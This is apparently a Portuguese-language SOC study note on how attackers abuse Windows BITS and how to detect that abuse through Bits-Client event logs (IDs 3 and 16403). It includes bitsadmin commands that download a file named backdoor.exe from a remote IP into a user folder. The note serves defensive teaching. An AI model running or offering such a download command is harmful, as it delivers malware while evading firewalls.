O Background Intelligent Transfer Service (BITS) foi introduzido pela Microsoft junto com o Windows XP para facilitar e coordenar o download e o upload de arquivos grandes.
Aplicações e componentes do sistema, incluindo o Windows Update, empregam o BITS para distribuir atualizações do sistema operativo e da aplicação de uma forma que minimize a interrupção do user.

As aplicações interagem com o Background Intelligent Transfer Service criando jobs que contém vários arquivos para download ou upload. 

O serviço BITS é executado num processo de host de serviço e pode agendar transferências para qualquer momento. 

Um banco de dados local armazena informações sobre jobs, arquivos e estados.

BITS, como muitas outras tecnologias, pode ser usado por aplicações legítimas, bem como por invasores. 

Quando aplicações maliciosas criam jobs BITS, os arquivos são transferidos ou carregados como parte do processo do host de serviço. 

Isso pode ser usado para contornar firewalls que podem bloquear processos inseguros ou desconhecidos, bem como para disfarçar a aplicação que solicitou a transferência. 

As transferências BITS também podem ser programadas para ocorrer em horários específicos, em vez de depender de processos de longa execução ou do agendador de tarefas.

## Usar o Bitsadmin para transferir arquivos

```txt
bitsadmin /create soc_eventlogs
```


![](../anexos/Pasted%20image%2020241203221023.png)

O primeiro comando usado  é para criar um job de bits chamado “soc_eventlogs”.



bitsadmin /addfile soc_eventlogs http://172.17.79.137/backdoor.exe C:\Users\soc\documents\file.exe

![](../anexos/Pasted%20image%2020241203221254.png)

Em seguida, os parâmetros do job são definidos. Eles incluem a URL/URI remota de onde recuperar um arquivo e o caminho local onde será guardado o arquivo transferido.

![](../anexos/Pasted%20image%2020241203221415.png)

![](../anexos/Pasted%20image%2020241203221441.png)

Isto é seguido por um sinalizador /resume que transfere o arquivo de destino. 
A sessão BITS permanece aberta até que o sinalizador /Complete seja usado para concluir o trabalho BITS.

## Análise

Estamos interessados ​​nos logs operacionais do Bits-Client, que estão localizados em “Logs de aplicações e serviços > Microsoft > Windows > Bits-Client > Operacional”.

![](../anexos/Pasted%20image%2020241203221710.png)

O primeiro ID de evento em que estamos interessados ​​é o ID de evento 3, que é gerado quando um job do Bits é criado.

![](../anexos/Pasted%20image%2020241203221801.png)

Os campos nos quais estamos interessados ​​são o nome do job de transferência, o ID do job que pode ser usado para rastrear outros eventos relacionados a este job específico e o proprietário do job, também conhecido como a conta de user usada para criar o job BITS.

O próximo ID de evento que precisamos procurar é o ID de evento 16403. 

Observamos que esse log é gerado quando atribuímos ao job os seus parâmetros, como URI remoto, caminho local, etc.

![](../anexos/Pasted%20image%2020241203221920.png)

![](../anexos/Pasted%20image%2020241203221955.png)


 Neste evento na aba "Detalhes" em vez da aba "Geral", pois tem títulos mais claros.
 
  Este log dá ótimas informações: cargo, ID do cargo e proprietário do cargo, assim como no evento anterior. 
  
  O foco principal aqui é o 'RemoteName' e o 'LocalName', que registam o URI remoto e o caminho do arquivo local. Podemos obter muito IOC daqui, como o IP/domínio remoto e o nome do arquivo.

